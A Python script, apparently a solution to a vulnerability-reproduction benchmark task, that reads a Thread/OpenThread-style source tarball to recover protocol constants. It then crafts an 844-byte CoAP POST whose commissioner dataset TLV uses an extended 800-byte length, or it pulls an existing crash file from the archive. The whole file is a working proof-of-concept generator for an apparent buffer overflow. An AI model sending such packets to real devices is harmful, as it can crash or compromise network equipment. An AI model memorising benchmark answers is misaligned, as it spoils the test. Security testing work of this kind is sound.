import tarfile
import re
import struct


_comment_re = re.compile(r'//.*?$|/\*.*?\*/', re.S | re.M)


def _strip_comments(text: str) -> str:
    return _comment_re.sub('', text)


def _eval_const_expr(expr: str, names: dict) -> int:
    expr = expr.strip()
    if not expr:
        return 0
    expr = re.sub(r'([0-9])([uUlL]+)\b', r'\1', expr)
    tokens = re.findall(r'[A-Za-z_]\w*|0x[0-9A-Fa-f]+|\d+|<<|>>|[~|&^+\-*/%()]', expr)
    converted = []
    for tok in tokens:
        if re.fullmatch(r'0x[0-9A-Fa-f]+', tok) or re.fullmatch(r'\d+', tok):
            converted.append(tok)
        elif tok in ('<<', '>>', '|', '&', '^', '+', '-', '*', '/', '%', '~', '(', ')'):
            converted.append(tok)
        else:
            val = names.get(tok, 0)
            converted.append(str(val))
    joined = ''.join(converted)
    try:
        return int(eval(joined, {"__builtins__": None}, {}))
    except Exception:
        return 0


def _parse_enum_body(body: str) -> dict:
    body = _strip_comments(body)
    items = body.split(',')
    mapping = {}
    current = None
    for item in items:
        item = item.strip()
        if not item:
            continue
        m = re.match(r'([A-Za-z_]\w*)\s*(?:=\s*(.+))?$', item)
        if not m:
            continue
        name, value_expr = m.group(1), m.group(2)
        if value_expr is not None:
            value = _eval_const_expr(value_expr, mapping)
        else:
            if current is None:
                value = 0
            else:
                value = current + 1
        mapping[name] = value
        current = value
    return mapping


def _parse_enum_mapping_around(text: str, marker_name: str):
    idx = text.find(marker_name)
    if idx == -1:
        return None
    search_start = max(0, idx - 4000)
    enum_pos = text.rfind('enum', search_start, idx)
    if enum_pos == -1:
        return None
    brace_start = text.find('{', enum_pos, idx + 4000)
    if brace_start == -1:
        return None
    depth = 0
    brace_end = None
    for i in range(brace_start, len(text)):
        c = text[i]
        if c == '{':
            depth += 1
        elif c == '}':
            depth -= 1
            if depth == 0:
                brace_end = i
                break
    if brace_end is None or brace_end <= brace_start:
        return None
    body = text[brace_start + 1:brace_end]
    return _parse_enum_body(body)


def _extract_enum_mapping(text: str, marker_name: str):
    return _parse_enum_mapping_around(text, marker_name)


def _extract_enum_value(text: str, name: str):
    mapping = _extract_enum_mapping(text, name)
    if mapping and name in mapping:
        return mapping[name]
    return None


def _extract_constant_like(text: str, name: str):
    val = _extract_enum_value(text, name)
    if val is not None:
        return val
    idx = text.find(name)
    if idx == -1:
        return None
    snippet = text[idx:idx + 120]
    m = re.search(re.escape(name) + r'\s*=\s*(0x[0-9A-Fa-f]+|\d+)', snippet)
    if not m:
        return None
    try:
        return int(m.group(1), 0)
    except Exception:
        return None


class Solution:
    def _scan_metadata(self, tar, members):
        dataset_type = None
        state_type = None
        state_accept = None
        ext_marker = None
        uri_path = None

        for m in members:
            if not m.isfile():
                continue
            lower = m.name.lower()
            if not (lower.endswith(('.c', '.cc', '.cpp', '.cxx', '.h', '.hpp', '.hh', '.hxx'))):
                continue
            f = tar.extractfile(m)
            if not f:
                continue
            try:
                text = f.read().decode('utf-8', 'ignore')
            finally:
                f.close()

            if uri_path is None and 'COMMISSIONER_SET' in text:
                for pattern in (
                    r'OT_URI_PATH_COMMISSIONER_SET[^"\n]*"([^"]+)"',
                    r'kUriPathCommissionerSet[^"\n]*"([^"]+)"',
                ):
                    m2 = re.search(pattern, text)
                    if m2:
                        uri_path = m2.group(1)
                        break

            if (dataset_type is None or state_type is None) and 'kCommissionerDataset' in text:
                mapping = _extract_enum_mapping(text, 'kCommissionerDataset')
                if mapping:
                    if dataset_type is None and 'kCommissionerDataset' in mapping:
                        dataset_type = mapping['kCommissionerDataset']
                    if state_type is None and 'kState' in mapping:
                        state_type = mapping['kState']

            if state_accept is None and 'kAccept' in text:
                val = _extract_enum_value(text, 'kAccept')
                if val is not None:
                    state_accept = val

            if ext_marker is None and 'kExtendedLength' in text:
                val = _extract_constant_like(text, 'kExtendedLength')
                if val is not None:
                    ext_marker = val

            if (
                dataset_type is not None
                and state_type is not None
                and state_accept is not None
                and ext_marker is not None
                and uri_path is not None
            ):
                break

        if ext_marker is None:
            ext_marker = 255

        return {
            'dataset_type': dataset_type,
            'state_type': state_type,
            'state_accept': state_accept,
            'ext_marker': ext_marker,
            'uri_path': uri_path,
        }

    def _encode_option_nibble(self, num: int):
        if num < 13:
            return num, b''
        elif num < 269:
            return 13, bytes([num - 13])
        else:
            if num > 0xFFFF + 269:
                num = 0xFFFF + 269
            return 14, struct.pack('!H', num - 269)

    def _encode_coap_option(self, prev: int, opt_num: int, value: bytes) -> bytes:
        delta = opt_num - prev
        length = len(value)
        d_nib, d_extra = self._encode_option_nibble(delta)
        l_nib, l_extra = self._encode_option_nibble(length)
        b = bytearray()
        b.append((d_nib << 4) | l_nib)
        b.extend(d_extra)
        b.extend(l_extra)
        b.extend(value)
        return bytes(b)

    def _build_poc_bytes(self, meta):
        dataset_type = meta.get('dataset_type')
        if dataset_type is None:
            return None
        state_type = meta.get('state_type')
        state_accept = meta.get('state_accept')
        ext_marker = meta.get('ext_marker', 255)
        uri_path = meta.get('uri_path') or ''

        dataset_len = 800

        payload = bytearray()

        if state_type is not None and state_accept is not None:
            payload.append(state_type & 0xFF)
            payload.append(1)
            payload.append(state_accept & 0xFF)

        payload.append(dataset_type & 0xFF)
        payload.append(ext_marker & 0xFF)
        payload.extend(struct.pack('!H', dataset_len))
        payload.extend(b'A' * dataset_len)

        coap = bytearray()
        ver = 1
        msg_type = 0  # Confirmable
        tkl = 0
        coap.append((ver << 6) | (msg_type << 4) | tkl)
        coap.append(2)  # POST
        coap.extend(struct.pack('!H', 0x1234))

        prev_opt = 0
        if uri_path:
            segments = [seg for seg in uri_path.split('/') if seg]
            for seg in segments:
                seg_bytes = seg.encode('ascii', 'ignore')
                if not seg_bytes:
                    continue
                coap.extend(self._encode_coap_option(prev_opt, 11, seg_bytes))
                prev_opt = 11

        coap.append(0xFF)
        coap.extend(payload)

        if len(coap) < 844:
            coap.extend(b'B' * (844 - len(coap)))

        return bytes(coap)

    def _find_existing_poc(self, tar, members, meta):
        dataset_type = meta.get('dataset_type')
        ext_marker = meta.get('ext_marker', 255)
        best_data = None
        best_score = None

        for m in members:
            if not m.isfile():
                continue
            if m.size == 0 or m.size > 10000:
                continue
            lower = m.name.lower()
            if lower.endswith((
                '.c', '.cc', '.cpp', '.cxx', '.h', '.hpp', '.hh', '.hxx',
                '.txt', '.md', '.cmake', '.json', '.yaml', '.yml', '.xml',
                '.py', '.sh', '.bat', '.ps1', '.rst', '.cfg'
            )):
                continue

            interesting = any(tok in lower for tok in (
                'poc', 'exploit', 'crash', 'id:', 'id_', 'testcase',
                'input', 'seed', 'packet', 'frame', 'commission', 'dataset',
                'overflow', 'buf', 'stack', 'fuzz'
            ))
            if not interesting and m.size != 844:
                continue

            f = tar.extractfile(m)
            if not f:
                continue
            data = f.read()
            f.close()

            if not data:
                continue

            ascii_bytes = sum(1 for b in data if 32 <= b < 127 or b in (9, 10, 13))
            if ascii_bytes / float(len(data)) > 0.97:
                continue

            if dataset_type is not None:
                dtb = dataset_type & 0xFF
                emb = ext_marker & 0xFF
                has_pattern = False
                for i in range(len(data) - 3):
                    if data[i] == dtb and data[i + 1] == emb:
                        has_pattern = True
                        break
                if not has_pattern:
                    continue

            score = abs(len(data) - 844)
            if best_data is None or score < best_score:
                best_data = data
                best_score = score

        return best_data

    def solve(self, src_path: str) -> bytes:
        with tarfile.open(src_path, 'r:*') as tar:
            members = tar.getmembers()
            meta = self._scan_metadata(tar, members)
            poc = self._find_existing_poc(tar, members, meta)
            if poc is not None:
                return poc
            poc2 = self._build_poc_bytes(meta)
            if poc2 is not None:
                return poc2
        return b'A' * 900
